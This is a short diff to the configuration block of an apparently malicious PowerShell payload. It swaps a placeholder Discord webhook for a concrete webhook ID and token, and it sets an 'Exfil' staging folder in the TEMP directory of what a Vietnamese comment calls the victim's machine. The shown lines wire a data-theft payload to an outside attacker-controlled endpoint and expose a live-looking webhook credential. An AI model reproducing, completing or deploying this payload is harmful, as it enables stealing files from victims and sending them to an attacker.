@@ -1,6 +1,6 @@
 #-- Payload configuration --#
 
-$WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'
+$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'
 
 # Thư mục tạm trên máy nạn nhân
 $destDir = "$env:TEMP\Exfil_$env:USERNAME"
